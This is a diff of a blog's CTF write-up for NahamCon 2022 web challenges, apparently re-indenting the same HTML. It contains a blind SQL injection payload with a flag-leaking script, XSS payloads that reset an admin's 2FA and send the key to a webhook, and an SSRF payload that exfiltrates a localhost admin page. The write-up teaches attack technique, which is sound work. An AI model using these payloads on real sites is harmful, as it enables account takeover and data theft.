@@ -43,257 +43,235 @@
 		    </section>
 
       <section id="wrapper">
- <section class="wrapper style2">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Overview
-    </h1>
-    <p>
-     Well it has been a really long time since I have updated my personal blog... I have been quite busy popping shells on machines, organising CTF events and banging my head trying to solve CTF challenges.
-    </p>
-    <p>
-     Speaking of banging ~~(no dirty innuendo here)~~,
-     <strong>
-      NahamCon CTF 2022
-     </strong>
-     was an absolute
-     <strong>
-      banger
-     </strong>
-     ! Every challenge I did was well thought out, did not have any brain cell killing nonsense that you sometimes see in other CTFs and was just a bucket full of fun!
-    </p>
-    <p>
-     I participated with my CTF team,
-     <strong>
-      PissedEmu
-     </strong>
-     (named after a glorious drink in Western Australia), and together we were able to reach
-     <strong>
-      10th place against over 3000+ teams
-     </strong>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/scoreboard.png"/>
-    </p>
-    <p>
-     Personally, I focused on the
-     <strong>
-      web
-     </strong>
-     ,
-     <strong>
-      devops
-     </strong>
-     (great to see challenges about this since it is overlooked) and a
-     <strong>
-      privilege escalation miscellaneous
-     </strong>
-     challenges. The rest of this article I will explain my thought process and how I solved the following challenges.
-    </p>
-    <h3 class="major">
-     Web
-    </h3>
-    <ul>
-     <li>
-      Flaskmetal Alchemist
-     </li>
-     <li>
-      Two For One
-     </li>
-     <li>
-      Hacker Ts
-     </li>
-     <li>
-      Deafcon
-     </li>
-     <li>
-      Poller
-     </li>
-    </ul>
-    <h3 class="major">
-     DevOps
-    </h3>
-    <ul>
-     <li>
-      Poisoned
-     </li>
-     <li>
-      Gitops
-     </li>
-    </ul>
-    <h3 class="major">
-     Miscellaneous
-    </h3>
-    <ul>
-     <li>
-      Degradation
-     </li>
-    </ul>
-   </div>
-  </div>
- </section>
- <section class="wrapper style6 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Web
-    </h1>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Flaskmetal Alchemist
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{order_by_blind}
-       </td>
-       <td>
-        260
-       </td>
-       <td>
-        168
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Fullmetal Alchemist is a
-     <strong>
-      Flask
-     </strong>
-     web application that
-     <em>
-      conveniently
-     </em>
-     allows you to search for any metal on the periodic table. You are also provided with the application source code to review and identify any security vulnerabilities.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/alchemist_page.png"/>
-    </p>
-    <p>
-     Looking through the source code we can see that
-     <code>
-      
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+<h1 class="major">
+ Overview
+</h1>
+<p>
+ Well it has been a really long time since I have updated my personal blog... I have been quite busy popping shells on machines, organising CTF events and banging my head trying to solve CTF challenges.
+</p>
+<p>
+ Speaking of banging ~~(no dirty innuendo here)~~,
+ <strong>
+  NahamCon CTF 2022
+ </strong>
+ was an absolute
+ <strong>
+  banger
+ </strong>
+ ! Every challenge I did was well thought out, did not have any brain cell killing nonsense that you sometimes see in other CTFs and was just a bucket full of fun!
+</p>
+<p>
+ I participated with my CTF team,
+ <strong>
+  PissedEmu
+ </strong>
+ (named after a glorious drink in Western Australia), and together we were able to reach
+ <strong>
+  10th place against over 3000+ teams
+ </strong>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/scoreboard.png"/>
+</p>
+<p>
+ Personally, I focused on the
+ <strong>
+  web
+ </strong>
+ ,
+ <strong>
+  devops
+ </strong>
+ (great to see challenges about this since it is overlooked) and a
+ <strong>
+  privilege escalation miscellaneous
+ </strong>
+ challenges. The rest of this article I will explain my thought process and how I solved the following challenges.
+</p>
+<h3 class="major">
+ Web
+</h3>
+<ul>
+ <li>
+  Flaskmetal Alchemist
+ </li>
+ <li>
+  Two For One
+ </li>
+ <li>
+  Hacker Ts
+ </li>
+ <li>
+  Deafcon
+ </li>
+ <li>
+  Poller
+ </li>
+</ul>
+<h3 class="major">
+ DevOps
+</h3>
+<ul>
+ <li>
+  Poisoned
+ </li>
+ <li>
+  Gitops
+ </li>
+</ul>
+<h3 class="major">
+ Miscellaneous
+</h3>
+<ul>
+ <li>
+  Degradation
+ </li>
+</ul>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Web
+</h1>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Flaskmetal Alchemist
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{order_by_blind}
+   </td>
+   <td>
+    260
+   </td>
+   <td>
+    168
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Fullmetal Alchemist is a
+ <strong>
+  Flask
+ </strong>
+ web application that
+ <em>
+  conveniently
+ </em>
+ allows you to search for any metal on the periodic table. You are also provided with the application source code to review and identify any security vulnerabilities.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/alchemist_page.png"/>
+</p>
+<p>
+ Looking through the source code we can see that
+ <code>
   sqlalchemy
- 
-     </code>
-     is used for managing the data on a
-     <code>
-      
+ </code>
+ is used for managing the data on a
+ <code>
   sqlite
- 
-     </code>
-     backend database. If you didn't know,
-     <code>
-      
+ </code>
+ backend database. If you didn't know,
+ <code>
   sqlalchemy
- 
-     </code>
-     is a powerful python module for managing SQL databases that you can use by creating models and letting
-     <code>
-      
+ </code>
+ is a powerful python module for managing SQL databases that you can use by creating models and letting
+ <code>
   sqlalchemy
- 
-     </code>
-     or SQL database. It can also be used for
-     <strong>
-      querying
-     </strong>
-     data from those models, which is generally safe except for a few scenarios...
-    </p>
-    <p>
-     One of the unsafe scenarios is if
-     <strong>
-      user input is directly inserted into the
-      <code>
-       
+ </code>
+ or SQL database. It can also be used for
+ <strong>
+  querying
+ </strong>
+ data from those models, which is generally safe except for a few scenarios...
+</p>
+<p>
+ One of the unsafe scenarios is if
+ <strong>
+  user input is directly inserted into the
+  <code>
    order_by
-  
-      </code>
-      method
-     </strong>
-     ! This is because sqlalchemy will just append
-     <code>
-      
+  </code>
+  method
+ </strong>
+ ! This is because sqlalchemy will just append
+ <code>
   ORDER BY {user_input}
- 
-     </code>
-     to the end of the of the query filter and
-     <strong>
-      does not escape the user input
-     </strong>
-     (cannot use prepared statements for
-     <code>
-      
+ </code>
+ to the end of the of the query filter and
+ <strong>
+  does not escape the user input
+ </strong>
+ (cannot use prepared statements for
+ <code>
   ORDER BY
- 
-     </code>
-     statements)! Therefore, if a developer does not filter user input going into the function
-     <code>
-      
+ </code>
+ statements)! Therefore, if a developer does not filter user input going into the function
+ <code>
   order_by
- 
-     </code>
-     then it is vulnerable to
-     <strong>
-      SQL injection
-     </strong>
-     !
-    </p>
-    <p>
-     We can see the web application is vulnerable by seeing that the
-     <code>
-      
+ </code>
+ then it is vulnerable to
+ <strong>
+  SQL injection
+ </strong>
+ !
+</p>
+<p>
+ We can see the web application is vulnerable by seeing that the
+ <code>
   index()
- 
-     </code>
-     route just whacks user input straight into
-     <code>
-      
+ </code>
+ route just whacks user input straight into
+ <code>
   order_by
- 
-     </code>
-     and is vulnerable to
-     <strong>
-      SQL injection
-     </strong>
-     when
-     <code>
-      
+ </code>
+ and is vulnerable to
+ <strong>
+  SQL injection
+ </strong>
+ when
+ <code>
   metals = Metal.query.filter(Metal.name.like("%{}%".format(search))).order_by(text(order))
- 
-     </code>
-     is executed.
-    </p>
-    <p>
-     <code>
-      
+ </code>
+ is executed.
+</p>
+<p>
+ <code>
   src/app.py
- 
-     </code>
-    </p>
-    <pre class="codehilite"><code class="language-python">@app.route("/", methods=["GET", "POST"])
+ </code>
+</p>
+<pre class="codehilite"><code class="language-python">@app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
         search = ""
@@ -313,174 +291,128 @@ def index():
         metals = Metal.query.all()
         return render_template("home.html", metals=metals)
 </code></pre>
-    <p>
-     So how do we exploit the
-     <code>
-      
+<p>
+ So how do we exploit the
+ <code>
   ORDER BY
- 
-     </code>
-     SQL injection vulnerability? It is not as simple as appending
-     <code>
-      
+ </code>
+ SQL injection vulnerability? It is not as simple as appending
+ <code>
   AND
- 
-     </code>
-     ,
-     <code>
-      
+ </code>
+ ,
+ <code>
   OR
- 
-     </code>
-     ,
-     <code>
-      
+ </code>
+ ,
+ <code>
   SELECT
- 
-     </code>
-     , etc since after the
-     <code>
-      
+ </code>
+ , etc since after the
+ <code>
   ORDER BY
- 
-     </code>
-     clause these clauses will cause an error to be returned. However,
-     <strong>
-      we can execute a different query and use the result of that query to change the result of the original query and construct a blind SQL injection attack
-     </strong>
-     !
-    </p>
-    <p>
-     It is now time to introduce you all to the most OP
-     <code>
-      
+ </code>
+ clause these clauses will cause an error to be returned. However,
+ <strong>
+  we can execute a different query and use the result of that query to change the result of the original query and construct a blind SQL injection attack
+ </strong>
+ !
+</p>
+<p>
+ It is now time to introduce you all to the most OP
+ <code>
   sqlite
- 
-     </code>
-     function for performing blind
-     <code>
-      
+ </code>
+ function for performing blind
+ <code>
   sqlite
- 
-     </code>
-     injection attacks.
-    </p>
-    <p>
-     <strong>
-      <code>
-       
+ </code>
+ injection attacks.
+</p>
+<p>
+ <strong>
+  <code>
    instr
-  
-      </code>
-     </strong>
-    </p>
-    <p>
-     Man I have abused this
-     <code>
-      
+  </code>
+ </strong>
+</p>
+<p>
+ Man I have abused this
+ <code>
   sqlite
- 
-     </code>
-     function so hard in several CTFs, getting unintended blind SQL injection solutions, since most challenge creators forget about it.
-    </p>
-    <p>
-     <code>
-      
+ </code>
+ function so hard in several CTFs, getting unintended blind SQL injection solutions, since most challenge creators forget about it.
+</p>
+<p>
+ <code>
   instr(column, 'some string')
- 
-     </code>
-     works by returning
-     <code>
-      
+ </code>
+ works by returning
+ <code>
   1
- 
-     </code>
-     if the provided string is in the column value and
-     <code>
-      
+ </code>
+ if the provided string is in the column value and
+ <code>
   0
- 
-     </code>
-     otherwise. You can use this to exfiltrate a flag from a column character by character, looking for results where you find the next character in a flag. For an example,
-     <code>
-      
+ </code>
+ otherwise. You can use this to exfiltrate a flag from a column character by character, looking for results where you find the next character in a flag. For an example,
+ <code>
   instr(flag, 'flag{a')
- 
-     </code>
-     will return
-     <code>
-      
+ </code>
+ will return
+ <code>
   1
- 
-     </code>
-     if the next character in the flag is
-     <code>
-      
+ </code>
+ if the next character in the flag is
+ <code>
   a
- 
-     </code>
-     , otherwise it returns
-     <code>
-      
+ </code>
+ , otherwise it returns
+ <code>
   0
- 
-     </code>
-     .
-    </p>
-    <p>
-     Knowing how
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ Knowing how
+ <code>
   instr
- 
-     </code>
-     functions, and the flag is located in the table
-     <code>
-      
+ </code>
+ functions, and the flag is located in the table
+ <code>
   flag
- 
-     </code>
-     in the column
-     <code>
-      
+ </code>
+ in the column
+ <code>
   flag
- 
-     </code>
-     I constructed the following blind SQL injection payload.
-    </p>
-    <pre class="codehilite"><code class="language-sql">1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)
+ </code>
+ I constructed the following blind SQL injection payload.
+</p>
+<pre class="codehilite"><code class="language-sql">1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)
 </code></pre>
-    <p>
-     How this works is when I find the next character in the flag, the upper
-     <code>
-      
+<p>
+ How this works is when I find the next character in the flag, the upper
+ <code>
   LIMIT
- 
-     </code>
-     will by
-     <code>
-      
+ </code>
+ will by
+ <code>
   1001
- 
-     </code>
-     and will dump all of the metals in the database. Otherwise, when I have not found the next character in the flag then the upper limit will only be
-     <code>
-      
+ </code>
+ and will dump all of the metals in the database. Otherwise, when I have not found the next character in the flag then the upper limit will only be
+ <code>
   1
- 
-     </code>
-     since
-     <code>
-      
+ </code>
+ since
+ <code>
   1000*0=0
- 
-     </code>
-     (in case you skipped maths in highschool). This causes a very significant difference in the content length in the response that I can easily check to see if I found the correct next flag!
-    </p>
-    <p>
-     Putting it all together, below is the dirty solution code that I wrote.
-    </p>
-    <pre class="codehilite"><code class="language-python">import requests, threading, queue, string
+ </code>
+ (in case you skipped maths in highschool). This causes a very significant difference in the content length in the response that I can easily check to see if I found the correct next flag!
+</p>
+<p>
+ Putting it all together, below is the dirty solution code that I wrote.
+</p>
+<pre class="codehilite"><code class="language-python">import requests, threading, queue, string
 import urllib.parse as url_parse
 
 QUERY = "1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)"
@@ -530,827 +462,747 @@ if __name__ == "__main__":
 
         result_q.task_done()
 </code></pre>
-    <p>
-     Executing the code above will leak the flag character by character as shown below.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/alchemist_solution.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style1 alt">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Two For One
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{96710ea6be916326f96de003c1cc97cb}
-       </td>
-       <td>
-        76
-       </td>
-       <td>
-        473
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Two For One was a really fun challenge that demonstrates the impact that a single vulnerability on a website can cause! Going to website we see that you need to sign in to access the Fort Knox service.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_page.png"/>
-    </p>
-    <p>
-     So I created an account and saw that there was a
-     <strong>
-      feedback
-     </strong>
-     feature on the
-     <strong>
-      settings page
-     </strong>
-     to provide
-     <em>
-      constructive
-     </em>
-     feedback about the website. I thought my feedback was really
-     <em>
-      constructive
-     </em>
-     to see if I can inject HTML by providing an
-     <strong>
-      image of my webhook
-     </strong>
-     (I use
-     <a href="https://webhook.site/">
-      this website for my webhooks during CTFs
-     </a>
-     )!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_imginject1.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_imginject2.png"/>
-    </p>
-    <p>
-     Noice I can inject some HTML code, so I can probably execute some
-     <strong>
-      inline Javascript and exploit a XSS vulnerability
-     </strong>
-     (no Content Security Policy to stop me from doing that)!
-    </p>
-    <p>
-     However, I could not simply exfiltrate my victims session cookie since the site sets the cookie as
-     <strong>
-      HttpOnly
-     </strong>
-     ... I will need to use other features on the website to be able to takeover the victim's account. Fortunately on the settings page, we could
-     <strong>
-      reset the 2FA key
-     </strong>
-     and
-     <strong>
-      change passwords and only needing the 2FA one time password (OTP)
-     </strong>
-     ! This means that the attack methodology to take over the account is:
-    </p>
-    <ol>
-     <li>
-      Reset the victim's 2FA key and exfiltrate the new key.
-     </li>
-     <li>
-      Using the OTP from step 1, change the password for the victim's account and login as them.
-     </li>
-    </ol>
-    <p>
-     To do this, I used the Javascript function
-     <code>
-      
+<p>
+ Executing the code above will leak the flag character by character as shown below.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/alchemist_solution.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Two For One
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{96710ea6be916326f96de003c1cc97cb}
+   </td>
+   <td>
+    76
+   </td>
+   <td>
+    473
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Two For One was a really fun challenge that demonstrates the impact that a single vulnerability on a website can cause! Going to website we see that you need to sign in to access the Fort Knox service.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_page.png"/>
+</p>
+<p>
+ So I created an account and saw that there was a
+ <strong>
+  feedback
+ </strong>
+ feature on the
+ <strong>
+  settings page
+ </strong>
+ to provide
+ <em>
+  constructive
+ </em>
+ feedback about the website. I thought my feedback was really
+ <em>
+  constructive
+ </em>
+ to see if I can inject HTML by providing an
+ <strong>
+  image of my webhook
+ </strong>
+ (I use
+ <a href="https://webhook.site/">
+  this website for my webhooks during CTFs
+ </a>
+ )!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_imginject1.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_imginject2.png"/>
+</p>
+<p>
+ Noice I can inject some HTML code, so I can probably execute some
+ <strong>
+  inline Javascript and exploit a XSS vulnerability
+ </strong>
+ (no Content Security Policy to stop me from doing that)!
+</p>
+<p>
+ However, I could not simply exfiltrate my victims session cookie since the site sets the cookie as
+ <strong>
+  HttpOnly
+ </strong>
+ ... I will need to use other features on the website to be able to takeover the victim's account. Fortunately on the settings page, we could
+ <strong>
+  reset the 2FA key
+ </strong>
+ and
+ <strong>
+  change passwords and only needing the 2FA one time password (OTP)
+ </strong>
+ ! This means that the attack methodology to take over the account is:
+</p>
+<ol>
+ <li>
+  Reset the victim's 2FA key and exfiltrate the new key.
+ </li>
+ <li>
+  Using the OTP from step 1, change the password for the victim's account and login as them.
+ </li>
+</ol>
+<p>
+ To do this, I used the Javascript function
+ <code>
   fetch
- 
-     </code>
-     for sending exfiltrated data to my web hook again. My first payload resets the victim's 2FA and sends the response to my webhook I can save the OTP key on my 2FA authenticator app.
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset2fa",{method:'post'}).then(r =&gt; r.text()).then((d) =&gt; {fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?otp="+btoa(d))});&lt;/script&gt;
+ </code>
+ for sending exfiltrated data to my web hook again. My first payload resets the victim's 2FA and sends the response to my webhook I can save the OTP key on my 2FA authenticator app.
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset2fa",{method:'post'}).then(r =&gt; r.text()).then((d) =&gt; {fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?otp="+btoa(d))});&lt;/script&gt;
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otp.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otpnoice.png"/>
-    </p>
-    <p>
-     Noice, now I have the new OTP key for the
-     <strong>
-      admin
-     </strong>
-     account! For generating the QR code to scan with my authenticator app, I was lazy and just used the
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otp.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otpnoice.png"/>
+</p>
+<p>
+ Noice, now I have the new OTP key for the
+ <strong>
+  admin
+ </strong>
+ account! For generating the QR code to scan with my authenticator app, I was lazy and just used the
+ <code>
   QRious
- 
-     </code>
-     javascript class that was already on the website.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otpnoicenoice.png"/>
-    </p>
-    <p>
-     <em>
-      Noice noice noice
-     </em>
-    </p>
-    <p>
-     Now all I needed to do was reset the admin's password and login. Using the OTP password I could do this by using the following payload which will change the
-     <code>
-      
+ </code>
+ javascript class that was already on the website.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otpnoicenoice.png"/>
+</p>
+<p>
+ <em>
+  Noice noice noice
+ </em>
+</p>
+<p>
+ Now all I needed to do was reset the admin's password and login. Using the OTP password I could do this by using the following payload which will change the
+ <code>
   admin
- 
-     </code>
-     password to
-     <code>
-      
+ </code>
+ password to
+ <code>
   getyaaccounttakenoverlol
- 
-     </code>
-     .
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset_password",{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify({"password":"getyaaccounttakenoverlol","password2":"getyaaccounttakenoverlol","otp":"&lt;PUT OTP HERE&gt;"})});&lt;/script&gt;
+ </code>
+ .
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset_password",{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify({"password":"getyaaccounttakenoverlol","password2":"getyaaccounttakenoverlol","otp":"&lt;PUT OTP HERE&gt;"})});&lt;/script&gt;
 </code></pre>
-    <p>
-     After waiting until the payload has been executed, I was able to login to the
-     <code>
-      
+<p>
+ After waiting until the payload has been executed, I was able to login to the
+ <code>
   admin
- 
-     </code>
-     account and view the secret flag!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_adminnoice.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style4">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Hacker Ts
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{461e2452088eb397b6138a5934af6231}
-       </td>
-       <td>
-        127
-       </td>
-       <td>
-        422
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     This challenge is about a pretty cool Hacker t-shirt page where you can make your own custom t-shirt with a bash command on it. Bummer they aren't selling any shirts...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_page.png"/>
-    </p>
-    <p>
-     There was also an admin page at
-     <code>
-      
+ </code>
+ account and view the secret flag!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_adminnoice.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Hacker Ts
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{461e2452088eb397b6138a5934af6231}
+   </td>
+   <td>
+    127
+   </td>
+   <td>
+    422
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ This challenge is about a pretty cool Hacker t-shirt page where you can make your own custom t-shirt with a bash command on it. Bummer they aren't selling any shirts...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_page.png"/>
+</p>
+<p>
+ There was also an admin page at
+ <code>
   /admin
- 
-     </code>
-     ,
-     <strong>
-      which was only accessible by `localhost
-     </strong>
-     ! Hmmm, I wonder if the T-Shirt page is vulnerable to
-     <strong>
-      Server-Side Request Forgery (SSRF)
-     </strong>
-     .
-    </p>
-    <p>
-     One method to check if it is vulnerable to SSRF is by seeing if you can execute Javascript code when the image of the t-shirt is generated. The payload below should overwrite the contents the document and would show on the generated image.
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;document.write("noice nearly SSRF!");&lt;/script&gt;
+ </code>
+ ,
+ <strong>
+  which was only accessible by `localhost
+ </strong>
+ ! Hmmm, I wonder if the T-Shirt page is vulnerable to
+ <strong>
+  Server-Side Request Forgery (SSRF)
+ </strong>
+ .
+</p>
+<p>
+ One method to check if it is vulnerable to SSRF is by seeing if you can execute Javascript code when the image of the t-shirt is generated. The payload below should overwrite the contents the document and would show on the generated image.
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;document.write("noice nearly SSRF!");&lt;/script&gt;
 </code></pre>
-    <p>
-     The first input to test would be the
-     <code>
-      
+<p>
+ The first input to test would be the
+ <code>
   text
- 
-     </code>
-     GET parameter in the URL and visiting the page below with the above payload shows that we can execute Javascript code!
-    </p>
-    <p>
-     <code>
-      
+ </code>
+ GET parameter in the URL and visiting the page below with the above payload shows that we can execute Javascript code!
+</p>
+<p>
+ <code>
   /exploit?text=&lt;script&gt;document.write("noice nearly SSRF!");&lt;/script&gt;&amp;color=%2324d600
- 
-     </code>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_nearlyssrf.png"/>
-    </p>
-    <p>
-     <em>
-      noice
-     </em>
-    </p>
-    <p>
-     Now the next thing I needed to figure out was how to exfiltrate the contents of the admin page. Ideally, I would use
-     <code>
-      
+ </code>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_nearlyssrf.png"/>
+</p>
+<p>
+ <em>
+  noice
+ </em>
+</p>
+<p>
+ Now the next thing I needed to figure out was how to exfiltrate the contents of the admin page. Ideally, I would use
+ <code>
   fetch
- 
-     </code>
-     but for the worst case scenarios I use
-     <code>
-      
+ </code>
+ but for the worst case scenarios I use
+ <code>
   XMLHttpRequest
- 
-     </code>
-     if
-     <code>
-      
+ </code>
+ if
+ <code>
   fetch
- 
-     </code>
-     unable. To test which method works, I tried both of them to send a request to my webhook using the following payloads for
-     <code>
-      
+ </code>
+ unable. To test which method works, I tried both of them to send a request to my webhook using the following payloads for
+ <code>
   fetch
- 
-     </code>
-     and
-     <code>
-      
+ </code>
+ and
+ <code>
   XMLHttpRequest
- 
-     </code>
-     respectively.
-    </p>
-    <p>
-     <strong>
-      Testing
-      <code>
-       
+ </code>
+ respectively.
+</p>
+<p>
+ <strong>
+  Testing
+  <code>
    fetch
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=fetch");&lt;/script&gt;
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=fetch");&lt;/script&gt;
 </code></pre>
-    <p>
-     <strong>
-      Testing
-      <code>
-       
+<p>
+ <strong>
+  Testing
+  <code>
    XMLHttpRequest
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=ohgoditsxmlhttprequest');x.send()&lt;/script&gt;
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=ohgoditsxmlhttprequest');x.send()&lt;/script&gt;
 </code></pre>
-    <p>
-     Unfortunately, only
-     <code>
-      
+<p>
+ Unfortunately, only
+ <code>
   XMLHttpRequest
- 
-     </code>
-     worked...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_xmlhttprequest.png"/>
-    </p>
-    <p>
-     Oh well, at least we can use the
-     <code>
-      
+ </code>
+ worked...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_xmlhttprequest.png"/>
+</p>
+<p>
+ Oh well, at least we can use the
+ <code>
   onload
- 
-     </code>
-     function so when the
-     <code>
-      
+ </code>
+ function so when the
+ <code>
   XMLHttpRequest
- 
-     </code>
-     has loaded the page I could send the full page contents as
-     <code>
-      
+ </code>
+ has loaded the page I could send the full page contents as
+ <code>
   base64
- 
-     </code>
-     text to my webhook using the following payload.
-    </p>
-    <pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
+ </code>
+ text to my webhook using the following payload.
+</p>
+<pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_goof.png"/>
-    </p>
-    <p>
-     <strong>
-      WAIT WHAT???
-     </strong>
-    </p>
-    <p>
-     <strong>
-      Why on earth is my payload breaking?!
-     </strong>
-    </p>
-    <p>
-     I spent a good half an hour trying to figure out why my payload was not working. Then it finally clicked for me and realised I am a big doofus.
-    </p>
-    <p>
-     The issue with the above payload is the following part of the payload.
-    </p>
-    <pre class="codehilite"><code class="language-js">y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText))
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_goof.png"/>
+</p>
+<p>
+ <strong>
+  WAIT WHAT???
+ </strong>
+</p>
+<p>
+ <strong>
+  Why on earth is my payload breaking?!
+ </strong>
+</p>
+<p>
+ I spent a good half an hour trying to figure out why my payload was not working. Then it finally clicked for me and realised I am a big doofus.
+</p>
+<p>
+ The issue with the above payload is the following part of the payload.
+</p>
